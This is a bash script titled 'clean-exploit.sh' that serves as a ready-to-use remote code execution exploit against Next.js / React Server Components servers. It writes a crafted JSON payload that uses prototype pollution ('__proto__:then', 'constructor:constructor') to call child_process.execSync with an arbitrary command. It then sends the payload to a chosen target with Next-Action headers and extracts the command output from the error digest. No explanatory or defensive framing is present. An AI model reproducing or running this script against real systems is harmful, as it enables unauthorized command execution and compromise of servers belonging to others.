#!/bin/bash
# File: clean-exploit.sh

TARGET=${1:-https://localhost}
COMMAND=${2:-ls}

# Create temporary payload files
cat > /tmp/payload.json << EOF
{
  "then": "\$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\\"then\\":\\"\$B1337\\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('$COMMAND',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:\`\${res}\`});",
    "_chunks": "\$Q2",
    "_formData": {
      "get": "\$1:constructor:constructor"
    }
  }
}
EOF

echo -n '"$@0"' > /tmp/payload2.txt

# Send request and clean output
curl -s -X POST "$TARGET" \
  -H "User-Agent: Mozilla/5.0" \
  -H "Next-Action: 1" \
  -H "X-Nextjs-Request-Id: $(openssl rand -hex 4)" \
  -H "X-Nextjs-Html-Request-Id: $(openssl rand -hex 8)" \
  -F "0=</tmp/payload.json" \
  -F "1=</tmp/payload2.txt" \
  -F "2=[]" \
  --max-time 10 \
  --insecure | \
  grep -o '"digest":"[^"]*"' | \
  cut -d'"' -f4

# Clean up
rm -f /tmp/payload.json /tmp/payload2.txt
